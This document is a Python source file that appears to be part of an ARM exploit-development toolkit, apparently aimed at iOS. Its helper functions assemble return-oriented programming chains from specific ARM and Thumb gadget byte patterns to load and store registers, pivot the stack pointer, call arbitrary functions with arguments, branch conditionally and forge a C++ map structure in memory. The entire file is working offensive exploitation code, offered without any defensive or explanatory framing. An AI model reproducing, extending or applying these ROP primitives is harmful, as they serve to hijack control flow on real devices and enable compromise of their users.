from goo import *
import goo
import dmini

def load_r0_r0(alt=0):
    if alt == 1:
        gadget(PC='+ 00 68 90 bd', a='R4, R7, PC')
    else:
        gadget(PC='+ 00 68 80 bd', a='R7, PC')

def load_r0_from(address):
    gadget(R4=address, PC=('+ 20 68 90 bd', '- 00 00 94 e5 90 80 bd e8'), a='R4, R7, PC')

def store_r0_to(address, alt=0):
    if alt == 1:
        gadget(R4=address-164, PC='+ c4 f8 a4 00 90 bd', a='R4, R7, PC')
    else:
        gadget(R4=address, PC='+ 20 60 10 bd', a='R4, PC')

def store_val_to(val, to):
    gadget(R4=to, R5=val, PC=('+ 25 60 b0 bd', '- 00 50 84 e5 b0 80 bd e8'), a='R4, R5, R7, PC')

def add_r0_by(addend):
    if isinstance(addend, (int, long)): addend %= (2**32)
    gadget(R4=addend, PC=('+ 20 44 90 bd', '- 00 00 84 e0 90 80 bd e8'), a='R4, R7, PC')

def set_r0_to(r0):
    gadget(R4=r0, PC=('+ 20 46 90 bd', '- 04 00 a0 e1 90 80 bd e8'), a='R4, R7, PC')

def set_r0to3(r0, r1=0, r2=0, r3=0, alt=0):
    if alt == 2:
        set_r0_to(r0)
        set_r1to3(r1, r2, r3)
    elif alt == 1:
        set_fwd('PC', dmini.cur.find(('+ 0f bd', '- 0f 80 bd e8')))
        heapadd(r0, r1, r2, r3, fwd('PC'))
    else:
        set_fwd('PC', dmini.cur.find('- 0f 80 bd e8'))
        heapadd(r0, r1, r2, r3, fwd('PC'))

def set_r1to3(r1, r2, r3):
    gadget(PC='+ 8e bd', b=[r1, r2, r3], a='R7, PC')

def set_sp_to(sp):
    gadget(R7=sp, PC=('+ a7 f1 00 0d 80 bd', '- 00 d0 47 e2 80 80 bd e8'), a='')
    clear_fwd() # pop {r7, pc} but that's not in this stack

def set_sp_to_sp():
    m = pointed('')
    set_sp_to(pointer(m))
    heapadd(m, fwd('R7'), fwd('PC'))

def fancy_set_sp_to(sp):
    # ditto for r8, r10, r11, r4-r7, pc
    gadget(R7=sp+24, PC=('+ a7 f1 18 0d bd e8 00 0d f0 bd', '- 18 d0 47 e2 00 0d bd e8 f0 80 bd e8'), a='')
    clear_fwd()

# Make some registers available but do nothing.
def make_avail():
    gadget(PC='+ f0 bd', a='R4, R5, R6, R7, PC')

# Make only r4 available.
def make_r4_avail():
    gadget(PC='+ 10 bd', a='R4, PC')

def make_r7_avail():
    gadget(PC='+ 80 bd', a='R7, PC')


def funcall(funcaddr, *args, **kwargs):
    if isinstance(funcaddr, basestring): # actually a symbol
        funcaddr = dmini.cur.sym(funcaddr)
    
    assert set(['load_r0', 'alt', 'alt2']).issuperset(kwargs)
    alt = kwargs.get('alt', 0)
        
    while len(args) < 4: args += (0,)
    if args[0] is None:
        set_r1to3(args[1], args[2], args[3])
    else:
        set_r0to3(args[0], args[1], args[2], args[3], alt=kwargs.get('alt2', 0))
    
    if kwargs.get('load_r0'): load_r0_r0()

    if goo.pic:
        # lame way
        assert len(args) <= 7
        set_fwd('PC', dmini.cur.find(('+ a0 47 b0 bd', '- 34 ff 2f e1 b0 80 bd e8')))
        set_fwd('R4', funcaddr)
        exhaust_fwd('R5', 'R7')
        heapadd(fwd('R4'), fwd('R5'), fwd('R7'), fwd('PC'))
        if len(args) > 4:
            set_fwd('R4', args[4])
        if len(args) > 5:
            set_fwd('R5', args[5])
        if len(args) > 6:
            set_fwd('R7', args[6])
    else:
        p = pointed('')
        set_fwd('PC', dmini.cur.find(('+ %s 47 a7 f1 04 0d 90 bd' % ['a0', 'a8'][alt], '??')))
        set_fwd(['R4', 'R5'][alt], funcaddr)
        set_fwd('R7', pointer(p) + 4)
        heapadd(*args[4:])
        heapadd(p)
        heapadd(fwd('R4'), fwd('R7'), fwd('PC'))

def store_to_r0(value):
    gadget(R4=value, PC=('+ 40 f8 04 4b 90 bd', '- 00 40 80 e5 90 80 bd e8'), a='R4, R7, PC')

def store_deref_plus_offset(deref, offset, value):
    # [[deref],offset] = value
    load_r0_from(deref)
    add_r0_const(offset)
    store_to_r0(value)

def cmp_r0_0_set_r0(zero, nonzero):
    # cmp r0, #0; ite ne; mov r0, r4; mov r0, r5; pop {r4, r5, r7, pc}
    gadget(R4=nonzero, R5=zero, PC='+ 00 28 14 bf 20 46 28 46 b0 bd', a='R4, R5, R7, PC')

def cmp_r0_0_branch():
    zero, nonzero = pointed(''), pointed('')
    # pop {r4, r7, pc}
    # ldm r0, {r2, r3, sp, pc}
    m_a = dmini.cur.find('+ 90 bd')
    cmp_r0_0_set_r0(ptrI(zero, m_a) - 8, ptrI(non_zero, m_a) - 8)
    set_fwd('PC', dmini.cur.find('- 0c a0 90 e8'))
    clear_fwd()
    return zero, nonzero

def set_r3_to(r3):
    gadget(PC='+ 88 bd', b=[r3], a='R7, PC')

# set r0 to ptr(cases[*key_ptr]); keys must be sortable
# oh, and we return a custom heap instead of using the usual one in case you want to ensure that this comes before actual strings
def map_switch(key_ptr, cases, name='ft.__ZNSt3mapIjPK8__CFDataSt4lessIjESaISt4pairIKjS2_EEEixERS6_', **kwargs):
    heap = troll_string() 
    items = sorted(cases.items())
    rb_node = 0
    for k, v in items:
        rb_node = ptr(I(
            0, # _M_color
            0, # _M_parent
            rb_node, # _M_left
            0, # _M_right
            k, #_M_value_field.first
        ) + v, heap=heap) # _M_value_field.second
    map = ptrI(
        0, # _M_key_compare
        0, # _M_header._M_color
        rb_node, # _M_header._M_parent
        0, # _M_header._M_left
        0, # _M_header._M_right
        len(cases), # _M_header._M_node_count (dunno if I need this)
    heap=heap)
    funcall(dmini.cur.sym(name, 'private'), map, key_ptr, **kwargs)
    return heap

def load_sp_r0():
    gadget(PC='- 1d f0 90 e8', a='')
    clear_fwd()

def come_from_load_sp_r0(m):
    come_from(m, 'R0, R2, R3, R4, R12, SP, LR, PC')
    m = pointed('')
    set_fwd('SP', pointer(m))
    heapadd(m)

def come_from(m, a='R4, R7, PC'):
    clear_fwd()
    heapadd(m, *map(fwd, a.split(', ')))
